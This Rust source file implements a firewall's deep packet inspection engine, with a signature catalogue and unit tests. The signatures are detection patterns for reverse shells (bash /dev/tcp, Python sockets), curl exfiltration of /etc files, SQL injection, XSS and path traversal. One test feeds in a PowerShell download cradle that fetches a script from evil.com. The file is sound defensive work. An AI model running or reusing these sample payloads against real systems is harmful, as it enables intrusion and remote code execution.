// firewallx/src/modules/dpi.rs
// Deep Packet Inspection (DPI) engine
//
// Identifies application-layer protocols and detects banned content patterns
// by inspecting packet payload bytes.  All matching is done on a byte-slice
// so the engine works with both text and binary payloads.

use std::collections::HashMap;

// ─────────────────────────────────────────────────────────────
// Application protocol identification
// ─────────────────────────────────────────────────────────────

/// High-level application protocol inferred from payload content.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum AppProtocol {
    Http,
    Https,
    Dns,
    Ssh,
    Ftp,
    Smtp,
    Tls,
    BitTorrent,
    Unknown,
}

impl std::fmt::Display for AppProtocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{:?}", self)
    }
}

// ─────────────────────────────────────────────────────────────
// Signature catalogue
// ─────────────────────────────────────────────────────────────

/// A single byte-pattern signature.
#[derive(Debug, Clone)]
pub struct Signature {
    pub id: u32,
    pub name: String,
    /// Byte pattern to search for inside the payload.
    pub pattern: Vec<u8>,
    /// Minimum payload offset at which to start the search.
    pub offset: usize,
    pub severity: Severity,
    pub category: SigCategory,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SigCategory {
    Malware,
    Exploit,
    Policy,    // e.g. blocked keywords
    Protocol,  // protocol identification
    Anomaly,
}

impl Signature {
    pub fn new(
        id: u32,
        name: &str,
        pattern: &[u8],
        offset: usize,
        severity: Severity,
        category: SigCategory,
    ) -> Self {
        Self {
            id,
            name: name.to_owned(),
            pattern: pattern.to_vec(),
            offset,
            severity,
            category,
        }
    }

    /// Returns `true` if `payload` contains this signature's pattern at or after `offset`.
    pub fn matches(&self, payload: &[u8]) -> bool {
        if payload.len() < self.offset {
            return false;
        }
        let search_area = &payload[self.offset..];
        search_area
            .windows(self.pattern.len())
            .any(|w| w == self.pattern.as_slice())
    }
}

// ─────────────────────────────────────────────────────────────
// DPI engine
// ─────────────────────────────────────────────────────────────

/// Result of inspecting a single payload.
#[derive(Debug, Clone)]
pub struct DpiResult {
    /// Best-guess application protocol.
    pub app_protocol: AppProtocol,
    /// All signatures that matched.
    pub matches: Vec<DpiMatch>,
    /// `true` if any Critical/High signature fired.
    pub blocked: bool,
}

/// A single signature hit.
#[derive(Debug, Clone)]
pub struct DpiMatch {
    pub sig_id: u32,
    pub sig_name: String,
    pub severity: Severity,
    pub category: SigCategory,
}

/// The DPI engine: holds a signature catalogue and performs payload analysis.
pub struct DpiEngine {
    signatures: Vec<Signature>,
    /// Protocol identification signatures (checked separately for AppProtocol detection).
    proto_sigs: Vec<(Vec<u8>, AppProtocol)>,
    /// Severity levels that cause a block verdict.
    block_on: Vec<Severity>,
    /// Per-category stats: category -> hit count
    stats: HashMap<String, u64>,
}

impl DpiEngine {
    /// Create a new DPI engine with a built-in default signature set.
    pub fn new() -> Self {
        let mut engine = Self {
            signatures: Vec::new(),
            proto_sigs: Self::default_proto_sigs(),
            block_on: vec![Severity::High, Severity::Critical],
            stats: HashMap::new(),
        };
        engine.load_default_signatures();
        engine
    }

    // ── Protocol identification byte markers ─────────────────
    fn default_proto_sigs() -> Vec<(Vec<u8>, AppProtocol)> {
        vec![
            (b"SSH-".to_vec(),           AppProtocol::Ssh),
            (b"GET ".to_vec(),           AppProtocol::Http),
            (b"POST ".to_vec(),          AppProtocol::Http),
            (b"HTTP/".to_vec(),          AppProtocol::Http),
            (b"HEAD ".to_vec(),          AppProtocol::Http),
            (b"\x16\x03".to_vec(),       AppProtocol::Tls),   // TLS record
            (b"220 ".to_vec(),           AppProtocol::Ftp),   // FTP banner
            (b"EHLO".to_vec(),           AppProtocol::Smtp),
            (b"HELO".to_vec(),           AppProtocol::Smtp),
            (b"\xd1\x1a\x00\x00".to_vec(), AppProtocol::BitTorrent), // BT handshake magic
        ]
    }

    // ── Built-in threat signatures ────────────────────────────
    fn load_default_signatures(&mut self) {
        // --- Web exploits ---
        self.add(Signature::new(1001, "SQL injection attempt",
            b"' OR '1'='1", 0, Severity::High, SigCategory::Exploit));
        self.add(Signature::new(1002, "SQL UNION SELECT",
            b"UNION SELECT", 0, Severity::High, SigCategory::Exploit));
        self.add(Signature::new(1003, "XSS script tag",
            b"<script>", 0, Severity::Medium, SigCategory::Exploit));
        self.add(Signature::new(1004, "XSS event handler",
            b"onerror=", 0, Severity::Medium, SigCategory::Exploit));
        self.add(Signature::new(1005, "Path traversal",
            b"../../../", 0, Severity::Medium, SigCategory::Exploit));
        self.add(Signature::new(1006, "Null byte injection",
            b"\x00\x00\x00\x00\x00", 0, Severity::Low, SigCategory::Anomaly));

        // --- Shellcode / malware ---
        self.add(Signature::new(2001, "ELF binary in payload",
            b"\x7fELF", 0, Severity::High, SigCategory::Malware));
        self.add(Signature::new(2002, "Windows PE in payload",
            b"MZ\x90\x00", 0, Severity::High, SigCategory::Malware));
        self.add(Signature::new(2003, "Powershell download cradle",
            b"IEX(New-Object", 0, Severity::Critical, SigCategory::Malware));
        self.add(Signature::new(2004, "Base64 encoded exe",
            b"TVqQAAMAAAA", 0, Severity::High, SigCategory::Malware));
        self.add(Signature::new(2005, "Reverse shell bash",
            b"bash -i >& /dev/tcp/", 0, Severity::Critical, SigCategory::Malware));
        self.add(Signature::new(2006, "Python reverse shell",
            b"socket.connect((", 0, Severity::High, SigCategory::Malware));

        // --- Command injection ---
        self.add(Signature::new(3001, "Shell command injection",
            b"; /bin/sh", 0, Severity::High, SigCategory::Exploit));
        self.add(Signature::new(3002, "Wget download attempt",
            b"wget http://", 0, Severity::Medium, SigCategory::Policy));
        self.add(Signature::new(3003, "Curl exfiltration pattern",
            b"curl -d @/etc/", 0, Severity::High, SigCategory::Exploit));

        // --- Policy violations ---
        self.add(Signature::new(4001, "Tor hidden service domain",
            b".onion", 0, Severity::Medium, SigCategory::Policy));
        self.add(Signature::new(4002, "Cleartext password field",
            b"password=", 0, Severity::Low, SigCategory::Policy));

        // --- Network anomalies ---
        self.add(Signature::new(5001, "EICAR test string",
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}", 0, Severity::Info, SigCategory::Anomaly));
    }

    /// Add a custom signature to the engine.
    pub fn add(&mut self, sig: Signature) {
        self.signatures.push(sig);
    }

    /// Add multiple signatures from an external source (e.g. Suricata rules)
    pub fn extend_signatures(&mut self, sigs: Vec<Signature>) {
        self.signatures.extend(sigs);
    }

    /// Remove a signature by id.
    pub fn remove(&mut self, id: u32) -> bool {
        let before = self.signatures.len();
        self.signatures.retain(|s| s.id != id);
        self.signatures.len() < before
    }

    /// Configure which severity levels trigger a block verdict.
    pub fn set_block_on(&mut self, levels: Vec<Severity>) {
        self.block_on = levels;
    }

    /// Inspect a raw payload and return a [`DpiResult`].
    pub fn inspect(&mut self, payload: &[u8]) -> DpiResult {
        let app_protocol = self.identify_protocol(payload);

        let mut matches = Vec::new();
        let mut blocked = false;

        for sig in &self.signatures {
            if sig.matches(payload) {
                let hit = DpiMatch {
                    sig_id: sig.id,
                    sig_name: sig.name.clone(),
                    severity: sig.severity.clone(),
                    category: sig.category.clone(),
                };
                if self.block_on.contains(&sig.severity) {
                    blocked = true;
                }
                // Update stats
                let key = format!("{:?}", sig.category);
                *self.stats.entry(key).or_insert(0) += 1;
                matches.push(hit);
            }
        }

        DpiResult { app_protocol, matches, blocked }
    }

    /// Identify application-layer protocol from the first bytes of the payload.
    fn identify_protocol(&self, payload: &[u8]) -> AppProtocol {
        for (pattern, proto) in &self.proto_sigs {
            if payload.len() >= pattern.len()
                && &payload[..pattern.len()] == pattern.as_slice()
            {
                return proto.clone();
            }
        }
        AppProtocol::Unknown
    }

    pub fn stats(&self) -> &HashMap<String, u64> {
        &self.stats
    }

    pub fn signature_count(&self) -> usize {
        self.signatures.len()
    }
}

impl Default for DpiEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ─────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sql_injection_detected() {
        let mut dpi = DpiEngine::new();
        let payload = b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1";
        let result = dpi.inspect(payload);
        assert!(result.matches.iter().any(|m| m.sig_id == 1001));
        assert!(result.blocked);
    }

    #[test]
    fn test_clean_payload_no_matches() {
        let mut dpi = DpiEngine::new();
        let payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n";
        let result = dpi.inspect(payload);
        assert!(result.matches.is_empty());
        assert!(!result.blocked);
    }

    #[test]
    fn test_protocol_identification_http() {
        let mut dpi = DpiEngine::new();
        let payload = b"GET /path HTTP/1.1\r\n";
        let result = dpi.inspect(payload);
        assert_eq!(result.app_protocol, AppProtocol::Http);
    }

    #[test]
    fn test_protocol_identification_ssh() {
        let mut dpi = DpiEngine::new();
        let payload = b"SSH-2.0-OpenSSH_8.9";
        let result = dpi.inspect(payload);
        assert_eq!(result.app_protocol, AppProtocol::Ssh);
    }

    #[test]
    fn test_protocol_identification_tls() {
        let mut dpi = DpiEngine::new();
        let payload = b"\x16\x03\x01\x00\xf1\x01";
        let result = dpi.inspect(payload);
        assert_eq!(result.app_protocol, AppProtocol::Tls);
    }

    #[test]
    fn test_elf_binary_blocked() {
        let mut dpi = DpiEngine::new();
        let mut payload = b"\x7fELF".to_vec();
        payload.extend_from_slice(&[0u8; 60]);
        let result = dpi.inspect(&payload);
        assert!(result.matches.iter().any(|m| m.sig_id == 2001));
        assert!(result.blocked);
    }

    #[test]
    fn test_powershell_cradle_critical() {
        let mut dpi = DpiEngine::new();
        let payload = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')";
        let result = dpi.inspect(payload);
        let hit = result.matches.iter().find(|m| m.sig_id == 2003).unwrap();
        assert_eq!(hit.severity, Severity::Critical);
        assert!(result.blocked);
    }

    #[test]
    fn test_path_traversal_medium_severity() {
        let mut dpi = DpiEngine::new();
        let payload = b"GET /../../../etc/passwd HTTP/1.1";
        let result = dpi.inspect(payload);
        assert!(result.matches.iter().any(|m| m.sig_id == 1005));
        // Medium severity — blocked only if block_on includes Medium
        // Default block_on = [High, Critical], so not blocked
        assert!(!result.blocked);
    }

    #[test]
    fn test_custom_block_on_includes_medium() {
        let mut dpi = DpiEngine::new();
        dpi.set_block_on(vec![Severity::Medium, Severity::High, Severity::Critical]);
        let payload = b"GET /../../../etc/passwd HTTP/1.1";
        let result = dpi.inspect(payload);
        assert!(result.blocked);
    }

    #[test]
    fn test_add_and_remove_custom_signature() {
        let mut dpi = DpiEngine::new();
        let before = dpi.signature_count();
        dpi.add(Signature::new(9999, "Custom canary", b"CANARY_TOKEN_XYZ", 0, Severity::High, SigCategory::Policy));
        assert_eq!(dpi.signature_count(), before + 1);

        let payload = b"hello CANARY_TOKEN_XYZ world";
        let result = dpi.inspect(payload);
        assert!(result.matches.iter().any(|m| m.sig_id == 9999));

        assert!(dpi.remove(9999));
        assert_eq!(dpi.signature_count(), before);
    }

    #[test]
    fn test_multiple_signatures_in_one_payload() {
        let mut dpi = DpiEngine::new();
        // XSS + path traversal in the same payload
        let payload = b"GET /../../../<script>alert(1)</script> HTTP/1.1";
        let result = dpi.inspect(payload);
        assert!(result.matches.len() >= 2);
    }

    #[test]
    fn test_unknown_protocol_for_binary() {
        let mut dpi = DpiEngine::new();
        let payload = &[0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01, 0x02];
        let result = dpi.inspect(payload);
        assert_eq!(result.app_protocol, AppProtocol::Unknown);
    }
}
